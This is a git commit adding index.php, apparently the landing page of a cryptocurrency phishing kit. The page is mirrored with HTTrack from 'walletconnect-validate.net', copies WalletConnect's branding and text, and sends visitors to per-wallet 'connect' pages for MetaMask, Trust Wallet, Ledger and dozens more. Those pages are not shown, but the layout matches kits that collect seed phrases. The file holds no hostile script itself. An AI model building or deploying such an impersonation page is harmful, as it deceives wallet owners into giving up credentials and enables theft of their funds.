15b1e61598929d14c3e458919d38882990a2febc
Gadgetjar02 <94129476+Gadgetjar02@users.noreply.github.com>
2021-11-12 18:20:23 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,425 @@
+<html>
+
+<!-- Mirrored from walletconnect-validate.net/?v by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:45:52 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="assets/main.css" type="text/css"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta property="og:image" content="images/logo.html">
+<link rel="icon" href="assets/logo.svg">
+<script>
+function show() {
+  var x = document.getElementById("hidden");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+
+  if (x.style.display === "block") {
+    document.getElementById("btn").innerHTML = "Show Less &uarr;";
+  } 
+}
+</script>
+<title>WalletConnect</title>
+</head>
+<body>
+<center>
+    <div class="top">
+        <a href="#footer?v" class="left">Github</a>
+
+        <a href="#?v" class="left">Docs</a>
+        <a href="index.html?v" class="main"><img src="assets/logo.svg" alt="logo"></a>
+        <a href="#wallets?v" class="left">Wallets</a>
+        <a href="#?v" class="left">Apps</a>
+</div>
+<br>
+<div class="gFeYHJ">WalletConnect</div>
+
+<div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
+<br>
+
+<div class="dXgqeu">
+<img src="assets/banner.png" alt="WalletConnect">
+</div>
+
+<div class="bout">
+<h2 class="home">What is WalletConnect?</h2>
+<p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
+A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser 
+extension wallets.</p><br>
+<h2 class="home">How does it work?</h2>
+<p>WalletConnect connects web applications to supported <a href="index.html#">mobile wallets</a>. WalletConnect session is started by a scanning a QR 
+code (desktop) or by clicking an application deep link (mobile).</p>
+</div>
+
+<div class="wallets" id="wallets">
+    <h1 class="home">Wallets</h1>
+<p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+
+<br>
+<div class="all">
+<div class="apps">
+    <a href="connect/index0.php?w=metamask"><img src="assets/metamask.png"></a><br>
+    MetaMask
+</div>
+
+<div class="apps">
+    <a href="connect/index1.php?w=MEW+wallet"><img src="assets/MEW.png"></a><br>
+    MEW Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index2.php?w=trust+wallet"><img src="assets/trustwallet.png"></a><br>
+    Trust Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index3.php?w=wallet+connect"><img src="assets/logo.svg"></a><br>
+    Wallect<br>Connect
+</div>
+
+<div class="apps">
+    <a href="connect/index4.php?w=coinbase+wallet"><img src="assets/coinbase.jpg"></a><br>
+    Coinbase Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index5.php?w=atomic+wallet"><img src="assets/atomic.png"></a><br>
+    Atomic Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index6.php?w=binance+smart+chain"><img src="assets/binance.png"></a><br>
+    Binance Smart Chain
+</div>
+
+<div class="apps">
+    <a href="connect/index7.php?w=bnb"><img src="assets/bnb.png"></a><br>
+    BNB
+</div>
+
+<div class="apps">
+    <a href="connect/index8.php?w=polkadot"><img src="assets/polkadot.png"></a><br>
+    Polkadot
+</div>
+
+<div class="apps">
+    <a href="connect/index9.php?w=xrp"><img src="assets/xrp.png"></a><br>
+    XRP
+</div>
+
+<div class="apps">
+    <a href="connect/index10.php?w=stellar"><img src="assets/stellar.png"></a><br>
+    Stellar
+</div>
+
+<div class="apps">
+    <a href="connect/index11.php?w=tezos"><img src="assets/tezos.png"></a><br>
+    Tezos
+</div>
+
+<div class="apps">
+    <a href="connect/index12.php?w=theta"><img src="assets/theta.png"></a><br>
+    Theta
+</div>
+
+<div class="apps">
+    <a href="connect/index13.php?w=tron"><img src="assets/tron.png"></a><br>
+    Tron
+</div>
+
+<div class="apps">
+    <a href="connect/index14.php?w=cosmos"><img src="assets/cosmos.png"></a><br>
+    Cosmos
+</div>
+
+<div class="apps">
+    <a href="connect/index15.php?w=kava"><img src="assets/kava.png"></a><br>
+    Kava
+</div>
+
+<div class="apps">
+    <a href="connect/index16.php?w=filecoin"><img src="assets/filecoin.png"></a><br>
+    Filecoin
+</div>
+
+<div class="apps">
+    <a href="connect/index17.php?w=solana"><img src="assets/solana.png"></a><br>
+    Solana
+</div>
+
+<div class="apps">
+    <a href="connect/index18.php?w=ethereum+classic"><img src="assets/ethereum-classic.png"></a><br>
+    Ethereum Classic
+</div>
+
+<div class="apps">
+    <a href="connect/index19.php?w=zilliqa"><img src="assets/zilliqa.png"></a><br>
+    Zilliqa
+</div>
+
+<div class="apps">
+    <a href="connect/index20.php?w=elrond"><img src="assets/elrond.jpg"></a><br>
+    Elrond
+</div>
+
+<div class="apps">
+    <a href="connect/index21.php?w=waves"><img src="assets/waves.png"></a><br>
+    Waves
+</div>
+
+<div class="apps">
+    <a href="connect/index22.php?w=icon"><img src="assets/icon.png"></a><br>
+    ICON
+</div>
+
+<div class="apps">
+    <a href="connect/index23.php?w=ontology"><img src="assets/ontology.png"></a><br>
+    Ontology
+</div>
+
+<div class="apps">
+    <a href="connect/index24.php?w=trust+vault"><img src="assets/harmony.jpg"></a><br>
+    Harmony
+</div>
+
+<div class="apps">
+    <a href="connect/index25.php?w=trust+vault"><img src="assets/parsiq.jpg"></a><br>
+    Parsiq
+</div>
+
+<div class="apps">
+    <a href="connect/index26.php?w=uni+swap"><img src="assets/uniswap.png"></a><br>
+    Uniswap
+</div>
+
+<div class="apps">
+    <a href="connect/index27.php?w=pancakeswap+vault"><img src="assets/pancakeswap.png"></a><br>
+    PancakeSwap
+</div>
+
+
+</div>
+<br>
+<button onclick="show()" class="btn" id="btn">Show More ↓</button>
+<br><br>
+<div class="hidden" id="hidden">
+<div class="all">
+    
+<div class="apps">
+    <a href="connect/index28.php?w=nano"><img src="assets/nano.png"></a><br>
+    Nano
+</div>
+
+<div class="apps">
+    <a href="connect/index29.php?w=tomo+chain"><img src="assets/tomo.png"></a><br>
+    Tomo Chain
+</div>
+
+<div class="apps">
+    <a href="connect/index30.php?w=iotex"><img src="assets/iotex.png"></a><br>
+    IoTex
+</div>
+
+<div class="apps">
+    <a href="connect/index31.php?w=wanchain"><img src="assets/wanchain.png"></a><br>
+    Wanchain
+</div>
+
+<div class="apps">
+    <a href="connect/index32.php?w=kin"><img src="assets/kin.png"></a><br>
+    Kin
+</div>
+
+<div class="apps">
+    <a href="connect/index33.php?w=nimiq"><img src="assets/nimiq.png"></a><br>
+    Nimiq
+</div>
+
+<div class="apps">
+    <a href="connect/index34.php?w=aion"><img src="assets/aion.png"></a><br>
+    Aion
+</div>
+
+<div class="apps">
+    <a href="connect/index35.php?w=thunder-token"><img src="assets/thundertoken.png"></a><br>
+    Thunder Token
+</div>
+
+<div class="apps">
+    <a href="connect/index36.php?w=aerternity"><img src="assets/aeternity.png"></a><br>
+    Aeternity
+</div>
+
+<div class="apps">
+    <a href="connect/index37.php?w=nebulas"><img src="assets/nebulas.png"></a><br>
+    Nebulas
+</div>
+
+<div class="apps">
+    <a href="connect/index38.php?w=fio"><img src="assets/fio.png"></a><br>
+    FIO
+</div>
+
+<div class="apps">
+    <a href="connect/index39.php?w=gochain"><img src="assets/gochain.png"></a><br>
+    GoChain
+</div>
+
+<div class="apps">
+    <a href="connect/index40.php?w=POA+network"><img src="assets/poa.png"></a><br>
+    POA Network
+</div>
+
+<div class="apps">
+    <a href="connect/index41.php?w=callisto"><img src="assets/callisto.png"></a><br>
+    Callisto
+</div>
+
+<div class="apps">
+    <a href="connect/index42.php?w=bitpay"><img src="assets/bitpay.jpg"></a><br>
+    BitPay
+</div>
+
+<div class="apps">
+    <a href="connect/index43.php?w=aktionariat"><img src="assets/aktionariat.png"></a><br>
+    Aktionariat
+</div>
+
+<div class="apps">
+    <a href="connect/index44.php?w=atwallet"><img src="assets/atwallet.png"></a><br>
+    AtWallet
+</div>
+
+<div class="apps">
+    <a href="connect/index45.phpl?w=guard+wallet"><img src="assets/guard.png"></a><br>
+    Guard Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index46.php?w=aave"><img src="assets/aave.jpg"></a><br>
+    AAVE
+</div>
+
+<div class="apps">
+    <a href="connect/index47.php?w=exodus"><img src="assets/exodus.jpg"></a><br>
+    Exodus
+</div>
+
+
+<div class="apps">
+    <a href="connect/index48.php?w=enjin"><img src="assets/enjin.jpg"></a><br>
+    Enjin
+</div>
+
+
+<div class="apps">
+    <a href="connect/index49.php?w=skale"><img src="assets/skale.png"></a><br>
+    Skale
+</div>
+
+<div class="apps">
+    <a href="connect/index50.php?w=portis"><img src="assets/portis.png"></a><br>
+    Portis
+</div>
+
+<div class="apps">
+    <a href="connect/index51.php?w=trezor"><img src="assets/trezor.png"></a><br>
+    Trezor
+</div>
+
+<div class="apps">
+    <a href="connect/index52.php?w=squarelink"><img src="assets/squarelink.png"></a><br>
+    Squarelink
+</div>
+
+<div class="apps">
+    <a href="connect/index53.php?w=torus"><img src="assets/torus.jpg"></a><br>
+    Torus
+</div>
+
+<div class="apps">
+    <a href="connect/index54.php?w=vechain"><img src="assets/vechain.jpg"></a><br>
+    VeChain
+</div>
+
+<div class="apps">
+    <a href="connect/index55.php?w=scatter+wallet"><img src="assets/scatter.jpg"></a><br>
+    Scatter Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index56.php?w=math+wallet"><img src="assets/math-wallet.png"></a><br>
+    Math Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index57.php?w=fortmatic"><img src="assets/fortmatic.png"></a><br>
+    FortMatic
+</div>
+
+<div class="apps">
+    <a href="connect/index58.php?w=digitex"><img src="assets/digitex.png"></a><br>
+    Digitex
+</div>
+
+<div class="apps">
+    <a href="connect/index59.php?w=ledger"><img src="assets/ledger.png"></a><br>
+    Ledger
+</div>
+
+<div class="apps">
+    <a href="connect/index60.php?w=defiat"><img src="assets/defiat.jpg"></a><br>
+    Defiat
+</div>
+
+<div class="apps">
+    <a href="connect/index61.php?w=authereum"><img src="assets/authereum.png"></a><br>
+    Authereum
+</div>
+
+<div class="apps">
+    <a href="connect/index62.php?w=flare+wallet"><img src="assets/flare.jpg"></a><br>
+    Flare Wallet
+</div>
+
+<div class="apps">
+    <a href="connect/index63.php?w=zelcore"><img src="assets/zelcore.png"></a><br>
+    Zelcore
+</div>
+
+<div class="apps">
+    <a href="connect/index64.php?w=bitkeep"><img src="assets/bitkeep.png"></a><br>
+    BitKeep
+</div>
+
+<div class="apps">
+    <a href="connect/index64.php?w=coin98"><img src="assets/coin98.png"></a><br>
+    Coin98
+</div>
+
+<div class="apps">
+    <a href="connect/index64.php?w=trust+vault"><img src="assets/trustvault.png"></a><br>
+    Trust Vault
+</div>
+
+</div>
+
+</div>
+
+
+</div>
+
+<footer><div id="footer">
+<p><img src="assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+<p><img src="assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+<p><img src="assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+<p><img src="assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+</div></footer>
+</center>
+</body>
+<!-- Mirrored from walletconnect-validate.net/?v by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:46:55 GMT -->
+</html>
